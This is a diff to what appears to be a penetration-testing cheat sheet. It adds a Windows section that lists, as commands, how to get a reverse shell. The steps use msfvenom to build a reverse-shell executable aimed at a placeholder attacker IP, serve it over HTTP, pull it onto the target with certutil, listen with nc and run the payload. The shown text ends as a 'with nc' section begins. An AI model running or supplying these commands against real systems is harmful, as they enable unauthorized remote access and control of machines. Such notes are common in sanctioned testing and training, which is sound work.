@@ -47,6 +47,37 @@ stty rows x columns y
 see also: https://gist.github.com/oscar-rk/f27464d7ab0c1fac4adf383b8a3527d3
 
 ## Windows
+
+### with reverse shell
+
+get reverse shell
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP.ADDRESS.HERE LPORT=443 -f exe -o reverse.exe
+```
+
+start python server
+```
+python3 -m http.server 80
+```
+
+download reverse shell on target machine
+```bash
+certutil -urlcache -f http://YOUR.IP.ADDRESS.HERE:80/reverse.exe C:\Windows\Temp\reverse.exe
+```
+
+listen on attacker machine
+```bash
+nc -lnvp 443
+```
+
+execute reverse shell
+```bash
+C:\Windows\Temp\reverse.exe
+```
+
+
+### with nc
+
 get nc.exe:
 ```bash
 sudo apt install windows-binaries
